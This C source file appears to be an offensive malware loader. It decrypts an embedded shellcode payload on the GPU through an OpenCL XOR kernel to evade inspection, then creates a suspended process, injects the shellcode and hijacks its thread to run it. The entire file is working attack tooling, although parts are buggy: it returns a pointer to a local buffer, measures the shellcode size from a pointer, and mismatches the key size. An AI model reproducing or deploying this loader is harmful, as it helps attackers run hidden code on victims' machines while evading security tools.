#include "Hook.h"


//What will we do here in this poisoning attack : 

//1-We will firstly check for available targeted gpus   


//2-We will decrypt payload using gpu

//3-We remove the payload from the memory

//4- recall the payload and move it to cpu

//5- Create a Suspended process

//6- Create then inject the shellcode in it

#define PAYLOAD_SIZE 520

unsigned char payload[PAYLOAD_SIZE] =
"\xfd\x9c\xd7\x10\xf9\x7f\x00\x00\x88\x9c\xd7\x10\xf9\x7f\x00\x00"
"\x48\x31\xd2\x56\x65\x48\x8b\x52\x7a\xf1\xc3\x10\xf9\x7f\x00\x00";


unsigned char xorKey[PAYLOAD_SIZE] = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08 };



const char* xorKernelSource =
"__kernel void xorOperation(__global const uchar* input, __global const uchar* key, __global uchar* output, int keySize) {\n"
"    int id = get_global_id(0);\n"
"    output[id] = input[id] ^ key[id % keySize];\n"
"}\n";



void checkError(cl_int err, const char* operation) {
    if (err != CL_SUCCESS) {
        fprintf(stderr, "Error during operation '%s': %d\n", operation, err);
        exit(1);
    }
}

// here we will check our GPUs
cl_device_id checkGPUs() {
    cl_int err;
    cl_uint numPlatform;
    cl_device_id selectedDevice = NULL;

    err = clGetPlatformIDs(0, NULL, &numPlatform);
    checkError(err, "Fetching platform count");

    cl_platform_id* platforms = (cl_platform_id*)malloc(numPlatform * sizeof(cl_platform_id));
    err = clGetPlatformIDs(numPlatform, platforms, NULL);
    checkError(err, "Fetching platform IDs");

    printf("Number of OpenCL platforms: %d\n", numPlatform);

    for (cl_uint i = 0; i < numPlatform; i++) {
        printf("Platform %d:\n", i + 1);

        char platformName[1024];
        err = clGetPlatformInfo(platforms[i], CL_PLATFORM_NAME, sizeof(platformName), platformName, NULL);
        checkError(err, "Fetching platform name");
        printf("\tPlatform Name: %s\n", platformName);

        cl_uint numDevices;
        err = clGetDeviceIDs(platforms[i], CL_DEVICE_TYPE_GPU, 0, NULL, &numDevices);
        if (err != CL_SUCCESS) {
            printf("\tNo GPUs found on this platform.\n");
            continue;
        }

        cl_device_id* devices = (cl_device_id*)malloc(numDevices * sizeof(cl_device_id));
        err = clGetDeviceIDs(platforms[i], CL_DEVICE_TYPE_GPU, numDevices, devices, NULL);
        checkError(err, "Fetching device IDs");

        printf("\tNumber of GPUs found: %d\n", numDevices);

        if (numDevices > 0) {
            selectedDevice = devices[0];
            printf("\tSelected GPU: %s\n", platformName);
            break;
        }

        free(devices);
    }

    free(platforms);
    return selectedDevice;
}

unsigned char* PayloadDecryption(cl_device_id device) {
    if (!device) {
        printf("No GPU available to execute the payload.\n");
        return NULL;
    }


    cl_int err;
    cl_context context = clCreateContext(NULL, 1, &device, NULL, NULL, &err);
    checkError(err, "Creating context");

    cl_command_queue queue = clCreateCommandQueueWithProperties(context, device, 0, &err);
    checkError(err, "Creating command queue");

    cl_mem gpuInputBuffer = clCreateBuffer(context, CL_MEM_READ_ONLY, sizeof(payload), NULL, &err);
    checkError(err, "Creating input buffer");

    cl_mem gpuKeyBuffer = clCreateBuffer(context, CL_MEM_READ_ONLY, sizeof(xorKey), NULL, &err);
    checkError(err, "Creating key buffer");

    cl_mem gpuOutputBuffer = clCreateBuffer(context, CL_MEM_WRITE_ONLY, sizeof(payload), NULL, &err);
    checkError(err, "Creating output buffer");

    err = clEnqueueWriteBuffer(queue, gpuInputBuffer, CL_TRUE, 0, sizeof(payload), payload, 0, NULL, NULL);
    checkError(err, "Writing payload to GPU");

    err = clEnqueueWriteBuffer(queue, gpuKeyBuffer, CL_TRUE, 0, sizeof(xorKey), xorKey, 0, NULL, NULL);
    checkError(err, "Writing XOR key to GPU");

    cl_program program = clCreateProgramWithSource(context, 1, (const char**)&xorKernelSource, NULL, &err);
    checkError(err, "Creating program");
    err = clBuildProgram(program, 1, &device, NULL, NULL, NULL);
    checkError(err, "Building program");

    cl_kernel kernel = clCreateKernel(program, "xorOperation", &err);
    checkError(err, "Creating XOR kernel");

    err = clSetKernelArg(kernel, 0, sizeof(cl_mem), &gpuInputBuffer);
    checkError(err, "Setting kernel arg 0");
    err = clSetKernelArg(kernel, 1, sizeof(cl_mem), &gpuKeyBuffer);
    checkError(err, "Setting kernel arg 1");
    err = clSetKernelArg(kernel, 2, sizeof(cl_mem), &gpuOutputBuffer);
    checkError(err, "Setting kernel arg 2");
    int payloadSize = PAYLOAD_SIZE;
    err = clSetKernelArg(kernel, 3, sizeof(int), &payloadSize);
    checkError(err, "Setting kernel arg 3");

    size_t globalSize = sizeof(payload);
    err = clEnqueueNDRangeKernel(queue, kernel, 1, NULL, &globalSize, NULL, 0, NULL, NULL);
    checkError(err, "Enqueueing XOR kernel");

    clFinish(queue);

    unsigned char ExecuteXor[PAYLOAD_SIZE] = { 0 };
    err = clEnqueueReadBuffer(queue, gpuOutputBuffer, CL_TRUE, 0, sizeof(ExecuteXor), ExecuteXor, 0, NULL, NULL);
    checkError(err, "Reading XOR result from GPU");

    printf("XOR result read from GPU memory:\n");

    clReleaseMemObject(gpuInputBuffer);
    clReleaseMemObject(gpuKeyBuffer);
    clReleaseMemObject(gpuOutputBuffer);
    clReleaseKernel(kernel);
    clReleaseProgram(program);
    clReleaseCommandQueue(queue);
    clReleaseContext(context);

    return ExecuteXor;
}

int main(int argc, char* argv[]) {


    if (argc < 2) {
        warning("Usage: %s <ProcessName>\n", argv[0]);
        return -1;
    }


    cl_device_id selectedGPU = checkGPUs();
    unsigned char* shellcode = PayloadDecryption(selectedGPU);


    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        printf("\\x%02x", shellcode[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    printf("\n");

    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = 0;
        printf("\\x%02x", payload[i]);

        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    DWORD processId;
    HANDLE hProcess, hThread;

    if (CreateSuspendedProcess(argv[1], &processId, &hProcess, &hThread)) {
        okay("Process created with PID: %lu\n", processId);

        SIZE_T shellcodeSize = sizeof(shellcode);
        PVOID pRemoteAddress = NULL;

        if (InjectShellcodeToRemoteProcess(hProcess, shellcode, shellcodeSize, &pRemoteAddress)) {
            info("Shellcode injected at: 0x%p\n", pRemoteAddress);

            if (HijackThread(hThread, pRemoteAddress)) {
                okay("Thread hijacked and shellcode executed successfully.\n");
            }
            else {
                warning("Failed to hijack the thread.\n");
            }
        }
        else {
            warning("Failed to inject shellcode.\n");
        }

        CloseHandle(hProcess);
        CloseHandle(hThread);
    }
    else {
        warning("Failed to create suspended process.\n");
    }

    return 0;
    return 0;
}
